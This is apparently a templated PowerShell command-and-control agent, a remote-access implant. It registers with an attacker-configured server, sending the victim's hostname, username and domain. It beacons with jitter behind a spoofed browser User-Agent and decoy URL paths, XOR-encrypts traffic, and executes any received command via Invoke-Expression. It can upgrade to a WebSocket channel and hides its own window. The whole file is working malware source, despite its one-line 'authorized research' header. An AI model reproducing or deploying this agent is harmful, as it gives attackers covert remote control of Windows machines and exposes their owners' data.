# PowerShell HTTP/HTTPS C2 Agent - For authorized security research only
$C2_HOST = "{{C2_HOST}}"
$C2_PORT = {{C2_PORT}}
$C2_SCHEME = "{{C2_SCHEME}}"
$RECONNECT_DELAY = 5
$BEACON_INTERVAL = {{BEACON_INTERVAL}}
$BEACON_JITTER = {{BEACON_JITTER}}
$VERIFY_SSL = ${{VERIFY_SSL}}

$BASE_URL = "${C2_SCHEME}://${C2_HOST}:${C2_PORT}"

function Invoke-XOREncryption {
    param([string]$Data)
    $key = [System.Text.Encoding]::UTF8.GetBytes('{{ENCRYPTION_KEY}}')
    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
    $encrypted = New-Object byte[] $dataBytes.Length
    for ($i = 0; $i -lt $dataBytes.Length; $i++) {
        $encrypted[$i] = $dataBytes[$i] -bxor $key[$i % $key.Length]
    }
    return [Convert]::ToBase64String($encrypted)
}

function Invoke-XORDecryption {
    param([string]$Data)
    $key = [System.Text.Encoding]::UTF8.GetBytes('{{ENCRYPTION_KEY}}')
    $dataBytes = [Convert]::FromBase64String($Data)
    $decrypted = New-Object byte[] $dataBytes.Length
    for ($i = 0; $i -lt $dataBytes.Length; $i++) {
        $decrypted[$i] = $dataBytes[$i] -bxor $key[$i % $key.Length]
    }
    return [System.Text.Encoding]::UTF8.GetString($decrypted)
}

function Get-SystemMetadata {
    $metadata = @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = "Windows"
        os_version = [System.Environment]::OSVersion.VersionString
        architecture = $env:PROCESSOR_ARCHITECTURE
        domain = $env:USERDOMAIN
        mode = "beacon"
        beacon_interval = $BEACON_INTERVAL
        beacon_jitter = $BEACON_JITTER
    }
    return $metadata
}

function Invoke-AgentCommand {
    param([string]$Command)
    try {
        $output = Invoke-Expression $Command 2>&1 | Out-String
        if ([string]::IsNullOrEmpty($output)) {
            return "Command executed successfully (no output)"
        }
        return $output
    } catch {
        return "Error: $($_.Exception.Message)"
    }
}

function Send-HTTPRequest {
    param(
        [string]$Url,
        [string]$Body = $null,
        [string]$Method = "POST"
    )

    try {
        $headers = @{
            'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            'Content-Type' = 'application/x-www-form-urlencoded'
            'Accept' = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }

        $params = @{
            Uri = $Url
            Method = $Method
            Headers = $headers
            TimeoutSec = 60
            UseBasicParsing = $true
        }

        if (-not $VERIFY_SSL -and $C2_SCHEME -eq "https") {
            # Skip certificate validation for self-signed certs
            if ($PSVersionTable.PSVersion.Major -ge 6) {
                $params['SkipCertificateCheck'] = $true
            } else {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
            }
        }

        if ($Body) {
            $params['Body'] = $Body
        }

        $response = Invoke-WebRequest @params
        return $response.Content
    } catch {
        return ""
    }
}

function Get-SleepTime {
    param(
        [int]$BaseInterval,
        [int]$JitterPercent
    )
    if ($JitterPercent -le 0 -or $JitterPercent -gt 100) {
        return $BaseInterval
    }
    $jitterAmount = $BaseInterval * ($JitterPercent / 100.0)
    $minSleep = [Math]::Max(0, $BaseInterval - $jitterAmount)
    $maxSleep = $BaseInterval + $jitterAmount
    return Get-Random -Minimum $minSleep -Maximum ($maxSleep + 1)
}

function Start-Agent {
    $agentId = $null
    $pendingResults = @()
    $beaconInterval = $BEACON_INTERVAL
    $beaconJitter = $BEACON_JITTER

    while ($true) {
        try {
            # Register if needed
            if (-not $agentId) {
                $metadata = Get-SystemMetadata
                $registerMsg = @{
                    type = "register"
                    metadata = $metadata
                } | ConvertTo-Json -Compress -Depth 4

                $encrypted = Invoke-XOREncryption -Data $registerMsg
                $response = Send-HTTPRequest -Url "$BASE_URL/submit-form" -Body $encrypted

                if ($response) {
                    $decrypted = Invoke-XORDecryption -Data $response
                    $data = $decrypted | ConvertFrom-Json
                    if ($data.type -eq "registered" -or $data.type -eq "checkin_ack") {
                        $agentId = $data.agent_id
                    }
                }

                if (-not $agentId) {
                    Start-Sleep -Seconds $RECONNECT_DELAY
                    continue
                }
            }

            # Checkin with results
            $metadata = Get-SystemMetadata
            $checkinMsg = @{
                type = "checkin"
                agent_id = $agentId
                metadata = $metadata
                results = $pendingResults
            } | ConvertTo-Json -Compress -Depth 4

            $encrypted = Invoke-XOREncryption -Data $checkinMsg
            $response = Send-HTTPRequest -Url "$BASE_URL/api/v1/update" -Body $encrypted
            $pendingResults = @()

            if ($response) {
                $decrypted = Invoke-XORDecryption -Data $response
                $data = $decrypted | ConvertFrom-Json

                if ($data.type -eq "registered") {
                    $agentId = $data.agent_id
                    continue
                }

                if ($data.type -eq "commands" -and $data.commands) {
                    foreach ($cmdData in $data.commands) {
                        $command = $cmdData.command

                        # Handle internal commands
                        if ($command -like "__set_interval:*") {
                            try {
                                $beaconInterval = [int]($command -split ":")[1]
                            } catch {}
                            continue
                        }
                        if ($command -eq "__kill") {
                            exit
                        }
                        if ($command -like "__upgrade_ws:*") {
                            try {
                                $wsData = ($command -split ":", 2)[1] | ConvertFrom-Json
                                Start-WebSocketUpgrade -AgentId $agentId -WsHost $wsData.ws_host -WsPort $wsData.ws_port
                                return
                            } catch {
                                $pendingResults += @{
                                    type = "response"
                                    output = "WebSocket upgrade failed"
                                    command = "upgrade_ws"
                                    timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss")
                                }
                            }
                            continue
                        }

                        if ($command) {
                            $output = Invoke-AgentCommand -Command $command
                            $pendingResults += @{
                                type = "response"
                                output = $output
                                command = $command
                                timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss")
                            }
                        }
                    }
                }
            }

            # Sleep with jitter
            $sleepTime = Get-SleepTime -BaseInterval $beaconInterval -JitterPercent $beaconJitter
            Start-Sleep -Seconds $sleepTime

        } catch {
            Start-Sleep -Seconds $RECONNECT_DELAY
        }
    }
}

function Start-WebSocketUpgrade {
    param(
        [string]$AgentId,
        [string]$WsHost,
        [int]$WsPort
    )

    try {
        $uri = "ws://${WsHost}:${WsPort}"
        $ws = New-Object System.Net.WebSockets.ClientWebSocket
        $ct = New-Object System.Threading.CancellationToken

        $task = $ws.ConnectAsync($uri, $ct)
        while (-not $task.IsCompleted) { Start-Sleep -Milliseconds 100 }

        # Checkin with existing agent_id
        $metadata = Get-SystemMetadata
        $checkinMsg = @{
            type = "checkin"
            agent_id = $AgentId
            metadata = $metadata
        } | ConvertTo-Json -Compress -Depth 4

        $encrypted = Invoke-XOREncryption -Data $checkinMsg
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($encrypted)
        $segment = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
        $task = $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct)
        while (-not $task.IsCompleted) { Start-Sleep -Milliseconds 100 }

        # Receive loop
        $buffer = New-Object byte[] 65536
        while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
            $segment = New-Object System.ArraySegment[byte] -ArgumentList @(,$buffer)
            $task = $ws.ReceiveAsync($segment, $ct)
            while (-not $task.IsCompleted) { Start-Sleep -Milliseconds 100 }

            if ($task.Result.Count -gt 0) {
                $received = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $task.Result.Count)
                $decrypted = Invoke-XORDecryption -Data $received
                $data = $decrypted | ConvertFrom-Json

                if ($data.type -eq "command") {
                    $output = Invoke-AgentCommand -Command $data.command
                    $response = @{
                        type = "response"
                        output = $output
                    } | ConvertTo-Json -Compress
                    $encrypted = Invoke-XOREncryption -Data $response
                    $bytes = [System.Text.Encoding]::UTF8.GetBytes($encrypted)
                    $segment = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
                    $task = $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct)
                    while (-not $task.IsCompleted) { Start-Sleep -Milliseconds 100 }
                }
                elseif ($data.type -eq "kill") {
                    $ws.Dispose()
                    exit
                }
            }
        }
        $ws.Dispose()
    } catch {
        # Upgrade failed, fall back to HTTP
    }
}

# Hide PowerShell window
$windowcode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
try {
    Add-Type -MemberDefinition $windowcode -Name "Win32ShowWindowAsync" -Namespace Win32Functions
    $hwnd = (Get-Process -PID $PID).MainWindowHandle
    [Win32Functions.Win32ShowWindowAsync]::ShowWindow($hwnd, 0) | Out-Null
} catch {}

Start-Agent
